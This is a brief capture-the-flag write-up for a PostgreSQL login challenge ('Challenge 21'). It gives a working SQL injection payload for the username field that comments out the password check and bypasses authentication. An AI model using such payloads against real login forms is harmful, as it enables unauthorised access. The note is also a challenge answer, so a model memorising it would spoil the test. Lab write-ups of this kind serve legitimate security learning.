# Po po po po postgresql - Challenge 21

Username is exploitable

Password doesn't appear to be since the input is hashed or something

This is the string we want to run:

`SELECT * FROM users WHERE (username = ('') OR 5 is not null) --')  AND password = ('hashpwd'))`

Username field will then be:

`') OR 5 is not null) --`
